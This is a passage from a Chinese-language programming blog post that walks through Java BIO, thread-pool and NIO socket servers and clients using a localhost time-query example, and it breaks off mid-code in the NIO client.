title=\"JavaI&#x2F;O\"></a>JavaI&#x2F;O</h3><p>最开始Java的Socket通信都是采用了同步阻塞模式（BIO），之后在JDK1.4中提供了NIO类库，在JDK1.7中对原有的NIO类库进行升级称为NIO2.0，提供AIO功能，支持文件和网络的异步操作。</p>\n<h3 id=\"JavaBIO实现\"><a href=\"#JavaBIO实现\" class=\"headerlink\" title=\"JavaBIO实现\"></a>JavaBIO实现</h3><p>在使用BIO的服务端中，使用一个独立的Acceptor线程负责监听客户端的连接，接受连接后为每个客户端创建一个新的线程进行链路处理，之后通过输出流返回给调用客户端，线程销毁。<br>举例，客户端socket请求服务端获取当前时间：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * TimeServer</span></span><br><span class=\"line\"><span class=\"comment\"> * 服务端</span></span><br><span class=\"line\"><span class=\"comment\"> * Created by  on 2018/1/31.</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">TimeServer</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">main</span><span class=\"params\">(String[] args)</span> <span class=\"keyword\">throws</span> IOException &#123;</span><br><span class=\"line\">        <span class=\"type\">int</span> <span class=\"variable\">port</span> <span class=\"operator\">=</span> <span class=\"number\">8888</span>;</span><br><span class=\"line\">        <span class=\"type\">ServerSocket</span> <span class=\"variable\">server</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">ServerSocket</span>(port);</span><br><span class=\"line\">        <span class=\"keyword\">while</span> (<span class=\"literal\">true</span>)&#123;</span><br><span class=\"line\">            <span class=\"type\">Socket</span> <span class=\"variable\">socket</span> <span class=\"operator\">=</span> server.accept();</span><br><span class=\"line\">            <span class=\"keyword\">new</span> <span class=\"title class_\">Thread</span>(<span class=\"keyword\">new</span> <span class=\"title class_\">TimeServerHandler</span>(socket)).start();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * TimeServerHandler</span></span><br><span class=\"line\"><span class=\"comment\"> * 服务端socket处理</span></span><br><span class=\"line\"><span class=\"comment\"> * Created by  on 2018/1/31.</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">TimeServerHandler</span> <span class=\"keyword\">implements</span> <span class=\"title class_\">Runnable</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> Socket socket;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"title function_\">TimeServerHandler</span><span class=\"params\">(Socket socket)</span> &#123;</span><br><span class=\"line\">        <span class=\"built_in\">this</span>.socket = socket;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">run</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">try</span> (</span><br><span class=\"line\">                <span class=\"comment\">//获取输入输出流</span></span><br><span class=\"line\">                <span class=\"type\">BufferedReader</span> <span class=\"variable\">in</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">BufferedReader</span>(<span class=\"keyword\">new</span> <span class=\"title class_\">InputStreamReader</span>(<span class=\"built_in\">this</span>.socket.getInputStream()));</span><br><span class=\"line\">                <span class=\"type\">PrintWriter</span> <span class=\"variable\">out</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">PrintWriter</span>(<span class=\"built_in\">this</span>.socket.getOutputStream(), <span class=\"literal\">true</span>);</span><br><span class=\"line\">        ) &#123;</span><br><span class=\"line\">            String line;</span><br><span class=\"line\">            <span class=\"type\">SimpleDateFormat</span> <span class=\"variable\">format</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">SimpleDateFormat</span>(<span class=\"string\">&quot;yyyy-MM-dd HH:mm:ss&quot;</span>);</span><br><span class=\"line\">            <span class=\"keyword\">while</span> ((line = in.readLine()) != <span class=\"literal\">null</span>) &#123;</span><br><span class=\"line\">                System.out.printf(<span class=\"string\">&quot;The time server receive order: %s \\n&quot;</span>, line);</span><br><span class=\"line\">                <span class=\"comment\">//输出当前时间</span></span><br><span class=\"line\">                out.println(<span class=\"string\">&quot;QUERY TIME&quot;</span>.equalsIgnoreCase(line) ? format.format(<span class=\"keyword\">new</span> <span class=\"title class_\">Date</span>()) : <span class=\"string\">&quot;ERROR&quot;</span>);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125; <span class=\"keyword\">catch</span> (IOException e) &#123;</span><br><span class=\"line\">            e.printStackTrace();</span><br><span class=\"line\">        &#125; <span class=\"keyword\">finally</span> &#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (<span class=\"built_in\">this</span>.socket != <span class=\"literal\">null</span>) &#123;</span><br><span class=\"line\">                <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">                    <span class=\"built_in\">this</span>.socket.close();</span><br><span class=\"line\">                &#125; <span class=\"keyword\">catch</span> (IOException e) &#123;</span><br><span class=\"line\">                    e.printStackTrace();</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">                <span class=\"built_in\">this</span>.socket = <span class=\"literal\">null</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * TimeClient</span></span><br><span class=\"line\"><span class=\"comment\"> * 客户端</span></span><br><span class=\"line\"><span class=\"comment\"> * Created by  on 2018/1/31.</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">TimeClient</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">main</span><span class=\"params\">(String[] args)</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">final</span> <span class=\"type\">int</span> <span class=\"variable\">port</span> <span class=\"operator\">=</span> <span class=\"number\">8888</span>;</span><br><span class=\"line\">        queryTime(port);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">queryTime</span><span class=\"params\">(<span class=\"type\">int</span> port)</span> &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">try</span> (</span><br><span class=\"line\">                <span class=\"type\">Socket</span> <span class=\"variable\">socket</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">Socket</span>(<span class=\"string\">&quot;127.0.0.1&quot;</span>, port);</span><br><span class=\"line\">                <span class=\"type\">BufferedReader</span> <span class=\"variable\">in</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">BufferedReader</span>(<span class=\"keyword\">new</span> <span class=\"title class_\">InputStreamReader</span>(socket.getInputStream()));</span><br><span class=\"line\">                <span class=\"type\">PrintWriter</span> <span class=\"variable\">out</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">PrintWriter</span>(socket.getOutputStream(), <span class=\"literal\">true</span>);</span><br><span class=\"line\">        ) &#123;</span><br><span class=\"line\">            out.println(<span class=\"string\">&quot;query time&quot;</span>);</span><br><span class=\"line\">            System.out.printf(<span class=\"string\">&quot;Server Time is:%s \\n&quot;</span>, in.readLine());</span><br><span class=\"line\">        &#125; <span class=\"keyword\">catch</span> (IOException e) &#123;</span><br><span class=\"line\">            e.printStackTrace();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>缺点：<br>服务端线程数和客户端并发数呈1：1，单客户端数量加大后会导致服务端线程创建数量增大，导致线程栈溢出创建线程失败等问题，最终服务端宕机，这种服务端可以采用线程池来优化。<br>线程池改进如下：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">TimeServer</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">main</span><span class=\"params\">(String[] args)</span> <span class=\"keyword\">throws</span> IOException &#123;</span><br><span class=\"line\">        <span class=\"type\">int</span> <span class=\"variable\">port</span> <span class=\"operator\">=</span> <span class=\"number\">8888</span>;</span><br><span class=\"line\">        poolServer(port);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">poolServer</span><span class=\"params\">(<span class=\"type\">int</span> port)</span><span class=\"keyword\">throws</span> IOException&#123;</span><br><span class=\"line\">        <span class=\"type\">ExecutorService</span> <span class=\"variable\">threadPool</span> <span class=\"operator\">=</span> Executors.newFixedThreadPool(<span class=\"number\">8</span>);</span><br><span class=\"line\">        <span class=\"type\">ServerSocket</span> <span class=\"variable\">server</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">ServerSocket</span>(port);</span><br><span class=\"line\">        <span class=\"keyword\">while</span> (<span class=\"literal\">true</span>) &#123;</span><br><span class=\"line\">            <span class=\"type\">Socket</span> <span class=\"variable\">socket</span> <span class=\"operator\">=</span> server.accept();</span><br><span class=\"line\">            threadPool.execute(<span class=\"keyword\">new</span> <span class=\"title class_\">TimeServerHandler</span>(socket));</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">     * 普通服务</span></span><br><span class=\"line\"><span class=\"comment\">     * <span class=\"doctag\">@param</span> port</span></span><br><span class=\"line\"><span class=\"comment\">     * <span class=\"doctag\">@throws</span> IOException</span></span><br><span class=\"line\"><span class=\"comment\">     */</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">ordinaryServer</span><span class=\"params\">(<span class=\"type\">int</span> port)</span><span class=\"keyword\">throws</span> IOException &#123;</span><br><span class=\"line\">        <span class=\"type\">ServerSocket</span> <span class=\"variable\">server</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">ServerSocket</span>(port);</span><br><span class=\"line\">        <span class=\"keyword\">while</span> (<span class=\"literal\">true</span>) &#123;</span><br><span class=\"line\">            <span class=\"type\">Socket</span> <span class=\"variable\">socket</span> <span class=\"operator\">=</span> server.accept();</span><br><span class=\"line\">            <span class=\"keyword\">new</span> <span class=\"title class_\">Thread</span>(<span class=\"keyword\">new</span> <span class=\"title class_\">TimeServerHandler</span>(socket)).start();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>服务端通过创建一个线程池，当有连接是，由线程池提交一个任务。<br>缺点：<br>当出现线程任务中某些任务非常耗时，这样会导致后续的链接一直在线程队列中等待，同时客户端也会一直阻塞等待服务端的返回。同时如果线程池中队列满了，会直接拒绝新的请求。</p>\n<h3 id=\"JavaNIO\"><a href=\"#JavaNIO\" class=\"headerlink\" title=\"JavaNIO\"></a>JavaNIO</h3><p>改进使用JavaNIO</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * MultiplexerTimeServer</span></span><br><span class=\"line\"><span class=\"comment\"> * 多路复用server</span></span><br><span class=\"line\"><span class=\"comment\"> * 步骤：</span></span><br><span class=\"line\"><span class=\"comment\"> * 1、打开Selector</span></span><br><span class=\"line\"><span class=\"comment\"> * 2、打开ServerSocketChannel</span></span><br><span class=\"line\"><span class=\"comment\"> * 3、ServerSocketChannel绑定监听地址</span></span><br><span class=\"line\"><span class=\"comment\"> * 4、注册ServerSocketChannel到Selector上</span></span><br><span class=\"line\"><span class=\"comment\"> * 5、启动线程轮询Selector中就绪的key</span></span><br><span class=\"line\"><span class=\"comment\"> * Created by  on 2018/1/31.</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">MultiplexerTimeServer</span> <span class=\"keyword\">implements</span> <span class=\"title class_\">Runnable</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> Selector selector;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> ServerSocketChannel serverSocketChannel;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">volatile</span> <span class=\"type\">boolean</span> stop;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"title function_\">MultiplexerTimeServer</span><span class=\"params\">(<span class=\"type\">int</span> port)</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">            <span class=\"comment\">//创建Reactor线程，打开多路复用器</span></span><br><span class=\"line\">            selector = Selector.open();</span><br><span class=\"line\">            <span class=\"comment\">//打开ServerSocketChannel用于监听客户端链接，是所有客户端链接的父管道</span></span><br><span class=\"line\">            serverSocketChannel = ServerSocketChannel.open();</span><br><span class=\"line\">            <span class=\"comment\">//设置绑定端口，设置为非阻塞模式</span></span><br><span class=\"line\">            serverSocketChannel.configureBlocking(<span class=\"literal\">false</span>);</span><br><span class=\"line\">            <span class=\"comment\">//10086请求链接最大队列长度</span></span><br><span class=\"line\">            serverSocketChannel.socket().bind(<span class=\"keyword\">new</span> <span class=\"title class_\">InetSocketAddress</span>(port), <span class=\"number\">10086</span>);</span><br><span class=\"line\">            <span class=\"comment\">//将serverSocketChannel注册到selector线程的多路复用器上，监听ACCEPT操作</span></span><br><span class=\"line\">            serverSocketChannel.register(selector, SelectionKey.OP_ACCEPT);</span><br><span class=\"line\">            System.out.printf(<span class=\"string\">&quot;The Server is Start: 120.0.0.1:%d \\n&quot;</span>, port);</span><br><span class=\"line\">        &#125; <span class=\"keyword\">catch</span> (IOException e) &#123;</span><br><span class=\"line\">            e.printStackTrace();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">run</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">while</span> (!stop) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">                <span class=\"comment\">//等待获取channel</span></span><br><span class=\"line\">                selector.select(<span class=\"number\">1000</span>);</span><br><span class=\"line\">                <span class=\"comment\">//获取所有复用器上的key</span></span><br><span class=\"line\">                Set&lt;SelectionKey&gt; selectionKeys = selector.selectedKeys();</span><br><span class=\"line\">                Iterator&lt;SelectionKey&gt; keyIterator = selectionKeys.iterator();</span><br><span class=\"line\">                SelectionKey key;</span><br><span class=\"line\">                <span class=\"keyword\">while</span> (keyIterator.hasNext()) &#123;</span><br><span class=\"line\">                    key = keyIterator.next();</span><br><span class=\"line\">                    keyIterator.remove();</span><br><span class=\"line\">                    <span class=\"comment\">//处理key</span></span><br><span class=\"line\">                    handleInput(key);</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125; <span class=\"keyword\">catch</span> (IOException e) &#123;</span><br><span class=\"line\">                e.printStackTrace();</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (selector != <span class=\"literal\">null</span>) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">                <span class=\"comment\">//多路复用器关闭后上面的注册的Channel和Pipe都会关闭</span></span><br><span class=\"line\">                selector.close();</span><br><span class=\"line\">            &#125; <span class=\"keyword\">catch</span> (IOException e) &#123;</span><br><span class=\"line\">                e.printStackTrace();</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">void</span> <span class=\"title function_\">handleInput</span><span class=\"params\">(SelectionKey key)</span> &#123;</span><br><span class=\"line\">        <span class=\"type\">SimpleDateFormat</span> <span class=\"variable\">format</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">SimpleDateFormat</span>(<span class=\"string\">&quot;yyyy-MM-dd HH:mm:ss&quot;</span>);</span><br><span class=\"line\">        <span class=\"comment\">//判断key是否有效</span></span><br><span class=\"line\">        <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (key.isValid()) &#123;</span><br><span class=\"line\">                <span class=\"comment\">//判断key是否OP_ACCEPT状态</span></span><br><span class=\"line\">                <span class=\"keyword\">if</span> (key.isAcceptable()) &#123;</span><br><span class=\"line\">                    <span class=\"comment\">//获取channel，实际上是最开始注册的那个serverSocketChannel</span></span><br><span class=\"line\">                    <span class=\"type\">ServerSocketChannel</span> <span class=\"variable\">ssc</span> <span class=\"operator\">=</span> (ServerSocketChannel) key.channel();</span><br><span class=\"line\">                    <span class=\"comment\">//阻塞监听新客户端请求，完成TCP3次握手，对TCP参数进行设置</span></span><br><span class=\"line\">                    <span class=\"type\">SocketChannel</span> <span class=\"variable\">socketChannel</span> <span class=\"operator\">=</span> ssc.accept();</span><br><span class=\"line\">                    socketChannel.configureBlocking(<span class=\"literal\">false</span>);</span><br><span class=\"line\">                    <span class=\"comment\">//监听到的客户端注册到selector上，监听OP_READ操作，读取客户端发送的网络消息</span></span><br><span class=\"line\">                    socketChannel.register(selector, SelectionKey.OP_READ);</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">                <span class=\"comment\">//判断key是否是可以读取</span></span><br><span class=\"line\">                <span class=\"keyword\">if</span> (key.isReadable()) &#123;</span><br><span class=\"line\">                    <span class=\"comment\">//获取读取的channel</span></span><br><span class=\"line\">                    <span class=\"type\">SocketChannel</span> <span class=\"variable\">socketChannel</span> <span class=\"operator\">=</span> (SocketChannel) key.channel();</span><br><span class=\"line\">                    <span class=\"comment\">//读取操作</span></span><br><span class=\"line\">                    <span class=\"comment\">//开辟1M缓冲区</span></span><br><span class=\"line\">                    <span class=\"type\">ByteBuffer</span> <span class=\"variable\">readBuffer</span> <span class=\"operator\">=</span> ByteBuffer.allocate(<span class=\"number\">1024</span>);</span><br><span class=\"line\">                    <span class=\"comment\">//读取数据</span></span><br><span class=\"line\">                    <span class=\"type\">int</span> <span class=\"variable\">readBytes</span> <span class=\"operator\">=</span> socketChannel.read(readBuffer);</span><br><span class=\"line\">                    <span class=\"keyword\">if</span> (readBytes &gt; <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">                        <span class=\"comment\">//将缓冲区当前的limit设置为position，position设置为0，用于后续对缓冲区的读取，不然读取都是缓冲区后面的都是0了</span></span><br><span class=\"line\">                        readBuffer.flip();</span><br><span class=\"line\">                        <span class=\"comment\">//依据缓冲区可读字节创建数组</span></span><br><span class=\"line\">                        <span class=\"type\">byte</span>[] bytes = <span class=\"keyword\">new</span> <span class=\"title class_\">byte</span>[readBuffer.remaining()];</span><br><span class=\"line\">                        <span class=\"comment\">//将缓冲区可读字节数组复制到新创建的字节数组中</span></span><br><span class=\"line\">                        readBuffer.get(bytes);</span><br><span class=\"line\">                        <span class=\"type\">String</span> <span class=\"variable\">body</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">String</span>(bytes, <span class=\"string\">&quot;utf-8&quot;</span>);</span><br><span class=\"line\">                        System.out.printf(<span class=\"string\">&quot;The time server receive order: %s \\n&quot;</span>, body);</span><br><span class=\"line\">                        <span class=\"type\">String</span> <span class=\"variable\">response</span> <span class=\"operator\">=</span> <span class=\"string\">&quot;QUERY TIME&quot;</span>.equalsIgnoreCase(body) ? format.format(<span class=\"keyword\">new</span> <span class=\"title class_\">Date</span>()) : <span class=\"string\">&quot;ERROR\\n&quot;</span>;</span><br><span class=\"line\">                        <span class=\"comment\">//返回操作</span></span><br><span class=\"line\">                        <span class=\"type\">byte</span>[] outBytes = response.getBytes();</span><br><span class=\"line\">                        <span class=\"type\">ByteBuffer</span> <span class=\"variable\">writeBuffer</span> <span class=\"operator\">=</span> ByteBuffer.allocate(outBytes.length);</span><br><span class=\"line\">                        writeBuffer.put(outBytes);</span><br><span class=\"line\">                        <span class=\"comment\">//用于后续的写</span></span><br><span class=\"line\">                        writeBuffer.flip();</span><br><span class=\"line\">                        <span class=\"comment\">//这里会出现写 半包 ，需要注册监听写操作</span></span><br><span class=\"line\">                        socketChannel.write(writeBuffer);</span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125; <span class=\"keyword\">catch</span> (IOException e) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (key.channel() != <span class=\"literal\">null</span>)&#123;</span><br><span class=\"line\">                <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">                    key.channel().close();</span><br><span class=\"line\">                &#125; <span class=\"keyword\">catch</span> (IOException e1) &#123;</span><br><span class=\"line\">                    e1.printStackTrace();</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">setStop</span><span class=\"params\">(<span class=\"type\">boolean</span> stop)</span> &#123;</span><br><span class=\"line\">        <span class=\"built_in\">this</span>.stop = stop;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * TimeServer</span></span><br><span class=\"line\"><span class=\"comment\"> * nio服务端</span></span><br><span class=\"line\"><span class=\"comment\"> * Created by  on 2018/1/31.</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">TimeServer</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">main</span><span class=\"params\">(String[] args)</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">final</span> <span class=\"type\">int</span> <span class=\"variable\">port</span> <span class=\"operator\">=</span> <span class=\"number\">8888</span>;</span><br><span class=\"line\">        <span class=\"keyword\">new</span> <span class=\"title class_\">Thread</span>(<span class=\"keyword\">new</span> <span class=\"title class_\">MultiplexerTimeServer</span>(port), <span class=\"string\">&quot;NIO-MultiplexerTimeServer&quot;</span>).start();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * TimeClientHandle</span></span><br><span class=\"line\"><span class=\"comment\"> * Created by  on 2018/1/31.</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">TimeClientHandle</span> <span class=\"keyword\">implements</span> <span class=\"title class_\">Runnable</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> String host;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"type\">int</span> port;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> Selector selector;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> SocketChannel socketChannel;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">volatile</span> <span class=\"type\">boolean</span> stop;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"title function_\">TimeClientHandle</span><span class=\"params\">(String host, <span class=\"type\">int</span> port)</span> &#123;</span><br><span class=\"line\">        <span class=\"built_in\">this</span>.host = host;</span><br><span class=\"line\">        <span class=\"built_in\">this</span>.port = port;</span><br><span class=\"line\">        <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">            selector = Selector.open();</span><br><span class=\"line\">            socketChannel = SocketChannel.open();</span><br><span class=\"line\">            socketChannel.configureBlocking(<span class=\"literal\">false</span>);</span><br><span class=\"line\">        &#125; <span class=\"keyword\">catch</span> (IOException e) &#123;</span><br><span class=\"line\">            e.printStackTrace();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">run</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">            doConnect();</span><br><span class=\"line\">        &#125; <span class=\"keyword\">catch</span> (IOException e) &#123;</span><br><span class=\"line\">            e.printStackTrace();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">while</span> (!stop) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">                selector.select(<span class=\"number\">1000</span>);</span><br><span class=\"line\">                Set&lt;SelectionKey&gt; selectionKeys = selector.selectedKeys();</span><br><span class=\"line\">                Iterator&lt;SelectionKey&gt; keyIterator = selectionKeys.iterator();</span><br><span class=\"line\">                <span class=\"type\">SelectionKey</span> <span class=\"variable\">key</span> <span class=\"operator\">=</span> <span class=\"literal\">null</span>;</span><br><span class=\"line\">                <span class=\"keyword\">while</span> (keyIterator.hasNext()) &#123;</span><br><span class=\"line\">                    key = keyIterator.next();</span><br><span class=\"line\">                    keyIterator.remove();</span><br><span class=\"line\">                    handleInput(key);</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125; <span class=\"keyword\">catch</span> (IOException e) &#123;</span><br><span class=\"line\">                e.printStackTrace();</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (selector != <span class=\"literal\">null</span>) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">                selector.close();</span><br><span class=\"line\">            &#125; <span class=\"keyword\">catch</span> (IOException e) &#123;</span><br><span class=\"line\">                e.printStackTrace();</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">void</span> <span class=\"title function_\">handleInput</span><span class=\"params\">(SelectionKey key)</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (key.isValid()) &#123;</span><br><span class=\"line\">                <span class=\"type\">SocketChannel</span> <span class=\"variable\">sc</span> <span class=\"operator\">=</span> (SocketChannel) key.channel();</span><br><span class=\"line\">                <span class=\"keyword\">if</span> (key.isConnectable()) &#123;</span><br><span class=\"line\">                    <span class=\"keyword\">if</span> (sc.finishConnect()) &#123;</span><br><span class=\"line\">                        sc.register(selector, SelectionKey.OP_READ);</span><br><span class=\"line\">                        doWrite(sc);</span><br><span class=\"line\">                    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">                        System.exit(<span class=\"number\">1</span>);</span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">                <span class=\"keyword\">if</span> (key.isReadable()) &#123;</span><br><span class=\"line\">                    <span class=\"type\">ByteBuffer</span> <span class=\"variable\">readBuffer</span> <span class=\"operator\">=</span> ByteBuffer.allocate(<span class=\"number\">1024</span>);</span><br><span class=\"line\">                    <span class=\"type\">int</span> <span class=\"variable\">readBytes</span> <span class=\"operator\">=</span> sc.read(readBuffer);</span><br><span class=\"line\">                    <span class=\"keyword\">if</span> (readBytes &gt; <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">                        readBuffer.flip();</span><br><span class=\"line\">                        <span class=\"type\">byte</span>[] bytes = <span class=\"keyword\">new</span> <span class=\"title class_\">byte</span>[readBuffer.remaining()];</span><br><span class=\"line\">                        readBuffer.get(bytes);</span><br><span class=\"line\">                        <span class=\"type\">String</span> <span class=\"variable\">body</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">String</span>(bytes, <span class=\"string\">&quot;utf-8&quot;</span>);</span><br><span class=\"line\">                        System.out.printf(<span class=\"string\">&quot;Now is %s \\n&quot;</span>, body);</span><br><span class=\"line\">                    &#125; <span 